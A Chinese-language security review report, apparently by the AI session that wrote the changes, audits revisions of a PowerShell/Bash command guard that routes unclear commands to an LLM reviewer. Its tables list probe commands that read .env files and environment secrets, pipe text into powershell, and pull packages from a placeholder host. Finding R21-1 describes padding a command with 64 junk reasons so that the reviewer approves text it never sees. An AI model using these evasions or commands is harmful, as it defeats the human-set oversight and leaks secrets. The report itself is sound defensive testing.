# 规格修订 21 和 22 的复审

日期：2026-11-11。代码：`295badc`（`main`，与 `origin/main` 相同）。

审查对象：
- 修订 21：`git show e52c596 -- src`。`pshelper.ps1` 的 `loose` 和带盘符的变量，`pscmd` 的 `ps-outside-command`、`ps-switch-value`、`ps-runner-value`，`pipeline._UNSHOWN_REASONS`，`send_gate` 的程序名长度。记录 `docs/reports/M3a-ps-outside-command.md`。
- 修订 22：`git show 646cb05 -- src`。`pshelper.ps1` 的 `Test-Output` 和名字种类 `output`，`pscmd` 的 `_known_value`、`_output_words`。记录 `docs/reports/M3a-ps-expression-output.md`。
- 规格：开头修订 21、22 的段落，§5.1，§7"PowerShell 里不在任何命令之内的文字"。

**这不是独立复审。** 两次修订都是这个会话写的，使用者说"开始复审"，在这里审。下面的结论都重新量过，没有照搬记录里的说法。作者的盲点，这次复审可能同样看不到。

**范围之外**：复审时工作区里有没提交的修订 23（`$LASTEXITCODE`、`$?` 算已知值）。它不在这次的范围里，判决都取自 `295badc` 导出的 `src`。只有 R21-1 另在工作区的代码上量了一次，结果相同。

**本次没有做的事**：
- 只新增了这份报告和状态说明里指向它的几行。没有改代码、规格正文、策略和测试。
- 没有读 `.env`，没有用 LLM 密钥，没有访问真实 LLM 服务。
- 没有读 `eval/authoring/h1-*`、`h2-*` 和留出批次，没有改系统设置。
- 没有跑测试，没有做变异测试，没有重跑作者的扫描。
- 没有在任何盘的根目录下建文件或目录。

**判决怎么取的**：
- 在 TEMP 下建假项目（`src/a.py`、`README.md`、`.env`、`sub/b.txt`、`x.py`，内容是编的），用完已删。
- 用 `pipeline.review` 取规则层的判决，默认策略，没有后端，平台 `windows`。PowerShell 命令经真实的 PowerShell 5.1 解析辅助进程。
- "送审"按 `pipeline._finish` 的条件算：判决是灰色，`incomplete_analysis`、`unshown_input`、`device_path` 都不拦，并且 `send_gate.gate` 给出了请求。请求没有发出去。
- "请求里有没有"：看请求的 JSON 里有没有探针里的标记 `BKCANARY`。
- 实测：新的 `powershell.exe -NoProfile -Command`，一个只在那次运行里存在的假环境变量；读文件的写法用 TEMP 下一个编出来的文件，用完已删。
- 版本：PowerShell 5.1.26100.9818。
- 探测脚本在 scratchpad（`rvr23_*.py`、`rvr23_*.json`、`rvr23_real*.ps1`），不进仓库。

下文的说法：
- "规则放行"：由 allow 规则给出。默认配置下，之后还有 Claude Code 自己的权限流程。
- "灰色"：没有规则作出决定。没有后端时问，有后端时送审，除非写明"不送审"。

## 1. 结论

**两次修订的目标都达到了，没有发现回退，没有发现不需要后端的放行。**
- 修订 21：会动手的表达式写在命令之外的 7 种写法（单独成句、字符串里的 `$(…)`、类的方法调用、脚本块的 `.Invoke()`、下标、`-f`、`-join`）都是灰色、不送审，参数默认值里的也是。带盘符的变量 8 种写法里，PowerShell 实测会读文件的 3 种（盘符、正斜杠、通配符）读 `.env` 都是 deny。
- 修订 22：变量被打印或流走的约 40 种写法（脚本块参数、函数体、`begin` 块、`trap`、带标签的循环、类的方法、一元逗号、哈希表的键、`switch` 的条件子句等），没有一种由规则放行；有后端时请求里都有它的文字，只有记录里已经写明的几处例外（条件、`exit`、赋值）。

**范围之内：高危 0，中危 1，低危 1，信息 3。**
**范围之外查到一条（O-2），按 X1 审查 F3、F4 的标准应算中危。** 它早于这两次修订，两种 shell 都有。

三条有级别的发现都只在配置了 LLM 后端时起作用。

| 编号 | 级别 | 一句话 | 要后端吗 | 来源 |
|---|---|---|---|---|
| R21-1 | 中 | 一行里先凑够 64 个别的灰色原因，`ps-switch-value`、`ps-runner-value`、`ps-pipe-to-interpreter` 就记不进去，整行照常送审，请求里没有被丢掉的那段文字 | 要 | 上限 `pscmd.MAX_REASONS` 在 M1b 就有（`9149823`）。前两个原因是修订 21 加的；`ps-pipe-to-interpreter` 的"不送审"是 M3a 的 X1 修复定的，一样受影响 |
| R22-1 | 低 | 参数的默认值是变量时，请求里没有它：`param($x = $env:SECRET_TOKEN) Get-Date; $x` 送审，请求里是 `Write-Output $x`，看不出 `$x` 是哪里来的。实测打印出环境变量 | 要 | 早于修订 21。修订 22 的记录只写了"默认值是常量时不在请求里" |
| R22-2 | 信息 | `for` 的初始化和迭代位置上的表达式不记（`for ($env:A; $false; ) { }`）。实测这两个位置的值不打印 | — | 修订 22 的范围 |
| R22-3 | 信息 | `param($true = $env:A) Get-Date; $true` 由规则放行。实测 `$true`、`$false`、`$null` 绑不上别的值（报错"只读或常量"），打印不出东西 | — | 修订 22 的已知值 |
| R21-2 | 信息 | `${FileSystem::C:\x\.env}`、`${\\?\C:\x\.env}`、`${\\.\C:\x\.env}` 实测不读文件，守卫照样按读文件判（deny）。`${\\srv\share\.env}` 实测是普通变量，守卫也当普通变量。偏紧，没有偏松 | — | 修订 21 |
| O-2 | 范围外 | `uv run`、`uvx`、`pipx run` 自己的选项不在请求里，也不进规则：`uv run --env-file .env pytest`、`uv run --index-url https://… pytest` 送审时请求里只有 `pytest -q`，`network` 是 `false`，没有 `.env` 这个路径 | 要 | 早于修订 21。修订 21 只处理了选项值带变量的情况，而且只在 PowerShell 里 |

## 2. 发现

### R21-1（中）：灰色原因有 64 条的上限，不送审的原因会被挤掉

`pscmd._State.add_gray` 最多记 64 个不同的原因，满了之后的直接丢掉。"不送审"靠的是原因本身：`pipeline.unshown_input` 在动作的灰色原因里找 `ps-switch-value`、`ps-runner-value`、`ps-pipe-to-interpreter`。这三个是在逐条处理命令时加的，排在后面就可能记不进去。

凑原因很容易：cmdlet 不认识的参数每个给一条 `ps-param-unresolved:<cmdlet>:<参数>`。下面的 `<垫>` 是三条 `Get-Date -a00 … -a29`（字母分别是 a、b、c），共 90 个原因，每条命令 31 个词，没有超过发送闸门的限制。

| 写法 | 判决 | 送审 | 请求里有标记 |
|---|---|---|---|
| `Get-ChildItem -Force:([IO.File]::ReadAllText('C:\x\BKCANARY'))`（对照） | 灰色 | 否，`ps-switch-value` | — |
| `<垫>; Get-ChildItem -Force:([IO.File]::ReadAllText('C:\x\BKCANARY'))` | 灰色 | **是** | **没有** |
| 同一条命令写在 `<垫>` 前面 | 灰色 | 否 | — |
| `<垫>; Get-ChildItem -Recurse:$env:BKCANARY` | 灰色 | **是** | **没有** |
| `uv run --with $env:BKCANARY pytest`（对照） | 灰色 | 否，`ps-runner-value` | — |
| `<垫>; uv run --with $env:BKCANARY pytest` | 灰色 | **是** | **没有** |
| `'Get-Content .env' \| powershell -Command -`（对照） | 灰色 | 否，`ps-pipe-to-interpreter` | — |
| `<垫>; 'Get-Content BKCANARY' \| powershell -Command -` | 灰色 | **是** | **没有** |
| `<垫>; [IO.File]::ReadAllText('C:\x\BKCANARY')` | 灰色 | 否，`ps-outside-command` | — |
| `<垫>; $x = $env:BKCANARY` | 灰色 | 否，赋值 | — |
| `<垫>; .\BOUNDK~1.EXE mode audit-only` | 灰色 | 否 | — |

- 不受影响的：`ps-outside-command`、`ps-compound:AssignmentStatementAst` 在处理命令之前就加了；`program-fold-variant`、`program-short-name-unresolved` 记在各自的动作上，不走这个上限。
- 没有后端时这些行都是问，不受影响。没有一行因此由规则放行：凑出来的原因本身就让整行是灰色。
- 模型看到的是三条带着几十个怪参数的 `Get-Date` 和一条看起来正常的命令。它会不会因此起疑，这里没有量，也不该指望。
- 工作区（修订 23）的代码上结果相同。

**级别**：和 X1 审查的 F3、F4 是同一类（模型被要求放行它没看到的文字），当时评中危。需要后端。

**建议**：上限满了就不该送审。最小的改法是 `add_gray` 在丢掉原因时改记一条 `ps-too-large`（它已经在 `pipeline._UNANALYSED_PREFIXES` 里），整行直接问。代价是带 64 个以上不同灰色原因的一行不再送审，正常命令到不了这个数。

### R22-1（低）：参数的默认值不在请求里

| 写法 | 判决 | 送审 | 请求里有标记 | 实测 |
|---|---|---|---|---|
| `param($x = $env:BKCANARY) Get-Date; $x` | 灰色 | 是 | **没有**（请求里是 `Get-Date` 和 `Write-Output $x`） | 打印出值 |
| `function f($x = $env:BKCANARY) { $x }; f` | 灰色 | 是 | **没有** | 打印出值 |
| `param($x = (Get-Content README.md)) Get-Date; $x` | 灰色 | 是 | —（`Get-Content` 那条命令在请求里） | — |
| `$x = $env:BKCANARY; $x`（对照：赋值） | 灰色 | 否 | — | — |
| `param($x = $env:BKCANARY) Get-Date` | 规则放行 | — | — | 不打印 |

- 参数的默认值和赋值的右边做的是同一件事：把一个值放进变量。赋值语句不送审（X1 审查 F3、F4），默认值照常送审，请求里没有它。
- 修订 22 的记录第 7 节写的是"绑定是常量时请求里也没有它……函数参数的默认值也一样"，只说了常量。默认值是变量时同样不在，记录没有写到。
- 早于修订 21。在修订 21 的代码（`e52c596`）上，第一条由规则放行（`$x` 单独成句当时不记），第二条已经是这样送审。所以修订 22 把第一条从放行变成了送审，没有变松。
- 默认值里有会动手的表达式时（`param($x = [IO.File]::ReadAllText('.env'))`）是 `ps-outside-command`，不送审，不受影响。

**级别**：低。模型看到一个来历不明的变量被打印，这本身是个提示；但它看不到来历。需要后端。

**建议**：把参数默认值当成一个"值有去处"的位置（值绑到变量上，和 `foreach` 的集合一样），按修订 22 的办法记成 `Write-Output <默认值>`，值已经知道的不记。修订 23 已经让辅助进程看 `ParameterAst`，加这一处改动不大。

### R22-2（信息）：`for` 的初始化和迭代位置

`for ($env:BKCANARY; $false; ) { Get-Date }` 送审，请求里没有标记。实测这个位置的值不打印（初始化、迭代、`while` 的条件都量了，输出是空的）。和记录里写的"只被判断的位置不记"一致，只是记录没有列出 `for` 的这两个位置。

### R22-3（信息）：`$true`、`$false`、`$null` 绑不上别的值

`param($true = $env:BKCANARY) Get-Date; $true` 由规则放行。实测 `param($true = …)`、`param($false = …)`、`param($null = …)`、`foreach ($true in …)`、脚本块里的 `param($true = …)` 都报"Cannot overwrite variable … because it is read-only or constant"，没有打印出值。所以把这三个当已知值是成立的。

### R21-2（信息）：带盘符的变量，各种写法

TEMP 下一个编出来的文件，看 PowerShell 5.1 读不读：

| 写法 | 实测读文件 | 守卫（路径是项目里的 `.env`） |
|---|---|---|
| `${C:\…\f.txt}` | 读 | deny |
| `${C:/…/f.txt}` | 读 | deny |
| `${C:\…\made-*.txt}`（通配符） | 读 | deny |
| `${FileSystem::C:\…\f.txt}` | 不读 | deny |
| `${Microsoft.PowerShell.Core\FileSystem::C:\…\f.txt}` | 不读 | deny |
| `${\\?\C:\…\f.txt}`、`${\\.\C:\…\f.txt}` | 不读 | deny |
| `${\\localhost\nosuchshare-bk\f.txt}`（没有这个共享） | 不是文件：赋值 5 再读回还是 5，`Get-Variable` 里有这个名字 | 当普通变量（`Write-Output`，灰色） |

会读的三种都按读文件判。不读的几种守卫判得比实际紧，没有偏松的。写在字符串里的这次没量出来（`-Command` 把引号去掉了），修订 21 的记录里量过。

### O-2（范围外）：运行器自己的选项不在请求里

`uv run`、`uvx`、`pipx run` 被剥掉之后，剩下的命令按它自己判，运行器的选项和选项值整个丢掉，请求里只有一个 `wrappers` 标记（这三个量过；`programs.peel_runner` 里还有 `uv tool run`、`poetry run`，没有量）。

| 写法（PowerShell 和 Bash 相同） | 送审的请求里 |
|---|---|
| `uv run pytest -q` | `pytest -q`，`wrappers: ["uv-run"]` |
| `uv run --with BKCANARY-pkg pytest -q` | `pytest -q`，`wrappers: ["uv-run-remote"]`，没有包名 |
| `uv run --with https://BKCANARY.example.com/x.whl pytest -q` | 同上，没有网址，`network: false` |
| `uv run --index-url https://BKCANARY.example.com/simple pytest -q` | `pytest -q`，`wrappers: ["uv-run"]`，没有网址，`network: false` |
| `uv run --env-file .env pytest -q` | `pytest -q`，`wrappers: ["uv-run"]`，没有 `.env` |
| `uvx --from BKCANARY-pkg cowsay hi` | `cowsay hi`，`wrappers: ["uvx"]`，没有包名 |
| `pipx run --spec BKCANARY-pkg cowsay hi` | `cowsay hi`，`wrappers: ["pipx-run"]`，没有包名 |

- 规则层也看不到这些路径和主机：`uv run --env-file .env pytest` 不触发 `no-secret-read`。带 `wrappers` 的动作不由 allow 规则放行，所以没有后端时这些都是问，没有一条放行。
- 修订 21 给"选项值带变量"加了 `ps-runner-value`（不送审），只在 PowerShell 里，只管带变量的。常量的选项值、Bash 里的，都照常送审。
- `--env-file .env` 把那个文件的内容放进子进程的环境，子进程是仓库里的代码；`--index-url` 换了下载包的地方。两者在请求里都看不出来。

**级别**：按 F3、F4 的标准是中危（模型被要求放行它没看到的参数）。需要后端。早于修订 21，不是这两次修订带来的。

**建议**：两种做法。一是运行器带了自己的选项就不送审（`uv run pytest` 不受影响，`uv run --with x pytest` 直接问）；二是把运行器的选项放进请求，并把 `--env-file`、`--index-url`、`--with <网址>` 的值交给路径层和域名层。第一种小，第二种才让规则也看得到。要先定设计。

## 3. 核对过、没有问题的

| 检查 | 结果 |
|---|---|
| 脚本块参数里的变量（`ForEach-Object`、`%`、`Where-Object`、`Select-Object` 的计算属性、`Sort-Object`、`Group-Object`、`Measure-Object`、`& { }`、`. { }`、`Invoke-Command`） | 10 种都是灰色、送审，请求里有标记。带脚本块的命令没有一条由规则放行 |
| 带重定向的表达式（`$env:A > out.txt`、`"key $env:A" >> README.md`、之后再 `Get-Content out.txt`） | 灰色、送审，请求里有标记 |
| 字符串里的 `$(…)`：`"$([IO.File]::ReadAllText('.env'))"` 单独成句 | 灰色、不送审。里面是命令时（`"$(Get-Content .env)"`）是 deny |
| 命令名是表达式（`& ([IO.File]::ReadAllText('.env'))`） | 灰色、送审，表达式的文字是请求里的程序名 |
| 类的方法、`begin` / `dynamicparam` 块、`trap`、`filter`、带标签的循环、同名函数盖住 `Get-Date` | 里面的变量都记成 `Write-Output`，请求里有标记 |
| `Get-Item Env:A`、`Get-ChildItem Env:`、`Get-Content Env:A`、`Test-Path Env:A`、`Get-Variable` | 灰色，没有一条由规则放行 |
| 带类型的参数、超过 128 个字符的程序名 | 不送审，和记录写的一样 |
| 修订 22 的记录第 7 节列的残余（`if` / `while` / `do` 的条件、`exit` 后面） | 送审，请求里没有标记；实测值不打印 |

## 4. 建议的顺序

（后记，2026-11-12：使用者说"先修这两条"，R21-1、R22-1 已按这里的建议修，规格修订 24，记录 `docs/reports/M3a-rev21-22-review-fixes.md`。O-2 之后按第一种做法修了（带值选项就不送审，两种 shell），规格修订 25，记录 `docs/reports/M3a-runner-options.md`。）

1. R21-1：改动最小，堵的是已有的三条"不送审"规定。
2. O-2：要先定设计（不送审，还是把选项交给规则）。
3. R22-1：按修订 22 的办法多记一个位置。
